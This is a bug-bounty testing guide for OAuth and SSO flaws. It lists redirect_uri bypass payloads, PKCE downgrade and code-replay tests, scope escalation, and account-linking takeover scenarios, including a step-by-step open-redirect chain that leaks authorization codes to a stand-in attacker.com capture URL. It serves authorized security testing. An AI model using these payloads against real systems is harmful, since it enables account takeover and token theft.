# OAuth & SSO Security Testing

OAuth/OIDC bugs are consistently among the highest-paying authentication findings, because a single misconfiguration often skips credentials entirely and goes straight to account takeover. This file goes deep because the topic rewards depth: the easy bypasses get patched fast, and the hunters who keep earning here are the ones who, when the obvious tricks fail, fuzz further instead of moving on.

## 1. Detection & recon

**Indicators** — look for these parameters in any login-adjacent request:
```
client_id  redirect_uri  response_type  scope  state  code_challenge
```

**Flow identification from `response_type`:**
```
response_type=code              -> Authorization Code flow (the one that matters most)
response_type=token             -> Implicit flow (deprecated in OAuth 2.1 — inherently weaker)
response_type=id_token          -> OpenID Connect implicit
response_type=code id_token     -> Hybrid flow
scope=openid                    -> OpenID Connect is in use (adds id_token, /userinfo, claims)
```

**Discovery endpoints** — these dump the provider's entire configuration, including every endpoint and supported flow:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

**Other endpoints worth probing directly:**
```
/authorize  /auth  /oauth  /token  /callback  /userinfo  /register
```
Admin/realm-management consoles are sometimes exposed on shared OAuth infrastructure (common on self-hosted Keycloak, for example):
```
/auth/admin/
/auth/admin/master/console/
```
For multi-tenant providers (e.g. Microsoft Entra ID), the discovery document is per-tenant — fetching it with a different tenant identifier can be used for tenant enumeration:
```
/auth/realms/{realm}/.well-known/openid-configuration
https://login.microsoftonline.com/{tenant}/.well-known/openid-configuration
```

## 2. redirect_uri validation bypass

This is the parameter that determines where the authorization code or token gets delivered — so it's the single most valuable thing to attack. Providers vary widely in how strictly they validate it; work through these roughly in order of how often they still work in the wild:

**Prefix-match bypass** (server checks "starts with the trusted domain" instead of exact match):
```
https://trusted.com.evil.com
https://trusted.comattacker.com         # no dot needed if the check is naive substring/prefix
```

**`@`/userinfo confusion** (parsers disagree about what's host vs. userinfo):
```
https://trusted.com@evil.com
https://evil.com#@trusted.com/
&@foo.evil-user.net#@bar.evil-user.net/
```

**Fragment/query confusion:**
```
https://trusted.com#evil.com
https://trusted.com?next=https://evil.com
```

**Server-side parameter pollution** (send the parameter twice; the auth check and the actual redirect target are sometimes read from different instances of it):
```
?redirect_uri=https://trusted.com/callback&redirect_uri=https://evil.com
```

**Localhost special-casing** (dev/test allowlist entries left enabled in production):
```
https://localhost.evil.com
https://127.0.0.1.evil.com
http://[::1].evil.com
```

**Path-level issues:**
```
https://trusted.com/callback/../../redirect      # directory traversal
https://trusted.com/callback?test=1              # extra query param — some validators only check the path, not the full URL
```

**Protocol/scheme tricks:**
```
javascript:alert(1)        # if accepted at all, can lead to token theft via injected script context
data:text/html,...
http://trusted.com         # downgrade from https — check if the scheme itself is validated
```

**CRLF injection** in the redirect_uri value, to test for response-splitting or header injection on the redirect.

**When every standard trick fails — fuzz the parser, don't give up.** Real-world cases exist where a "fully secured" redirect_uri (every standard bypass blocked) was still broken by an interaction between the server's URL-decoding behavior and its validation function specifically — a path/encoding confusion the validator never normalized before checking. If `@`, prefix, and fragment tricks are all rejected cleanly, the next move is to try double-encoding (`%2540`), mixed encoding, and decode-then-revalidate timing issues rather than assuming the endpoint is solid.

## 3. Open redirect chaining (often the highest-value chain in this entire file)

A redirect_uri that's *correctly* restricted to the legitimate client domain is still exploitable if that domain itself has an unrelated open redirect anywhere on it — because the OAuth provider only validates the domain, not what that domain's own code does next.

```
1. Find an open redirect on the legitimate client domain, e.g.
   https://trusted.com/redirect?next=<arbitrary URL>
2. Set redirect_uri to that open-redirect path, pointed at attacker.com:
   redirect_uri=https://trusted.com/redirect?next=https://attacker.com/capture
3. Send this crafted OAuth authorization link to the victim.
4. Victim authenticates normally with the real provider — everything
   about the auth step looks legitimate.
5. Provider redirects to the (validly-whitelisted) trusted.com URL,
   which then bounces the victim again, via its own open redirect,
   to attacker.com — carrying the authorization code or token with it.
6. Attacker's server logs the code/token from the incoming request
   (query string, fragment-via-Referer, or directly if response_type=token).
7. For the authorization code flow specifically: the attacker doesn't
   even need the client_secret — many client apps' /callback endpoints
   will exchange any valid code presented to them, so submitting the
   stolen code there directly can complete the takeover.
```

This exact chain (open redirect + OAuth) has produced full account-takeover reports across many programs historically — it's worth specifically hunting for an open redirect on the client app whenever the redirect_uri validation itself looks solid, rather than concluding OAuth is "secure" once redirect_uri checks pass.

**Confirming, not just observing:** you need the actual leaked code/token captured on infrastructure you control, and ideally the subsequent account access using it — not just "the open redirect exists" and "the OAuth flow exists" as two separate, unconnected observations.

## 4. `state` parameter / OAuth CSRF

```
1. Check whether `state` is present at all in the authorization request.
2. If present, check whether it's actually validated on the callback —
   try submitting the callback with a different/missing state and see
   if the flow still completes.
3. Check randomness/predictability of state values across several
   requests (should be unguessable, ideally tied to the user's
   pre-auth session).
```

**Why missing/unvalidated state matters:** without it, an attacker can start their own OAuth flow (logging in with *their own* third-party account), capture the resulting callback URL/code, and trick the victim's browser into completing that request — which links the *attacker's* third-party identity to the *victim's* session on the target app. This is a direct analogue of classic login CSRF, and on apps that link-by-default (no extra confirmation step), it can mean the attacker now has standing access to the victim's account via "their" linked login method.

## 5. PKCE testing

PKCE (RFC 7636) exists to stop a stolen authorization code from being redeemable by anyone but the client that requested it — relevant for public clients (SPAs, mobile apps) that can't hold a secret.

```
1. Send an authorization request with no code_challenge at all.
   If the server still issues a code, PKCE is optional/not enforced —
   any intercepted code is now usable by an attacker with no further work.

2. If code_challenge is present and required, test downgrade from
   S256 to "plain": resend the token exchange using the original
   code_challenge value itself as the code_verifier. If the server
   doesn't track which method the authorization request specified and
   just re-hashes whatever verifier shows up, this succeeds — defeating
   the entire point of PKCE in this flow.

3. Test code_verifier length/entropy validation (spec requires 43-128
   characters) — a short or predictable verifier may be brute-forceable.

4. Exchange a code without ever sending a code_verifier, even though
   one was set during the authorization step, to see if it's enforced
   on the token endpoint side at all (the two steps are sometimes
   validated by different code paths).
```

## 6. Authorization code & token handling

```
- Code reuse: redeem the same authorization code twice. Should fail
  the second time; if it doesn't, a leaked code can be replayed
  indefinitely.
- Code lifetime: wait 5-10+ minutes, then redeem. Should be expired
  (spec recommends minutes, not hours).
- Cross-client redemption: capture a code issued for Client A's
  client_id/redirect_uri; try redeeming it using Client B's
  credentials at the token endpoint. Success means the code isn't
  properly bound to the client that requested it.
- Race condition: fire two redemption requests for the same code in
  parallel (Burp "send group in parallel" / Turbo Intruder) to check
  for a TOCTOU bug in code consumption.
- ROPC grant (`grant_type=password`) — if still enabled, it accepts
  raw credentials directly at the token endpoint, bypassing the
  browser-based flow (and any MFA tied to it) entirely. Worth checking
  whether it's still reachable even if not advertised in discovery.
- Implicit flow exposure: if `response_type=token` is still supported,
  the access token rides in the URL fragment — recoverable from
  browser history, and from `Referer` headers if the callback page
  loads any third-party resource. Check whether the client app then
  persists that token into `localStorage`/`sessionStorage`, which
  would make it readable by any unrelated script-injection bug
  elsewhere on the same origin.
- ID token (OIDC) validation: test `alg:none`, RS256→HS256 confusion,
  and claims tampering exactly as in the `api-security` skill's
  `jwt-testing.md` — an id_token is a JWT and inherits that whole
  attack surface. Also specifically test whether `email_verified`
  in the claims is actually checked before the client trusts the
  email for account linking (see open the "account linking" section
  below).
```

## 7. Scope and claims escalation

```
- Request elevated/undocumented scopes directly in the authorization
  request: scope=openid+profile+email+admin, scope=openid+profile+*
- Get user consent for a narrow scope (e.g. "read"), then request a
  wider scope ("read write") during token refresh without new consent.
- Try a scope downgrade at authorization time specifically to see if
  it skips the consent screen, then check whether the resulting token
  actually carries broader access than what was consented to.
- Scope delimiter confusion: try comma-separated vs space-separated
  scope strings if the provider's parser might handle one inconsistently.
- After obtaining a token, call /userinfo and any other claims-bearing
  endpoint and check whether more fields come back than the granted
  scope should allow (name/email/address beyond what was consented to).
```

## 8. Account linking and identity trust (the highest-value OAuth bug class)

The core pattern across nearly all serious OAuth account-takeover reports: the target trusts an identity attribute (almost always email) returned by the OAuth/OIDC provider, without confirming it was actually verified.

```
Scenario A — attacker registers locally on the target with victim@target.com,
leaving it unverified, then completes OAuth login using a provider account
that also claims victim@target.com. If the target silently links the
existing (attacker-controlled) unverified local account, the attacker now
owns an account tied to the victim's email.

Scenario B — the OAuth/OIDC provider itself allows account creation with
an arbitrary, unverified email claim. If the target trusts that claim
outright (doesn't check an `email_verified: true` claim, or doesn't check
it at all), logging in via that provider with the victim's email grants
access to whatever target-app account is tied to it.

Scenario C — in the implicit flow, the client-side code that finalizes
login sometimes trusts parameters echoed back through the browser (e.g.
an email field in a POST built from URL/fragment data) without
re-verifying them against the actual token/userinfo response — letting
an attacker simply substitute their own email for the victim's in that
client-side step and have the server accept it.
```

Test by walking through registration and account linking using two test identities and an email you fully control end-to-end — never use a real third party's email in a live test, and don't attempt to actually take over an account that isn't a stand-in you created.

## What makes an OAuth/SSO finding confirmed, not theoretical

You need an actual second account (standing in for "the victim") that you accessed via the redirect/state/code/scope/linking flaw, end-to-end — a real authorization code or token captured on infrastructure you control and successfully exchanged or used, not just "the `state` parameter appears to be missing" or "the redirect_uri allowlist looks loose." A bypass technique that's merely accepted by the server with no demonstrated token/code capture downstream is a lead, not a finding yet.
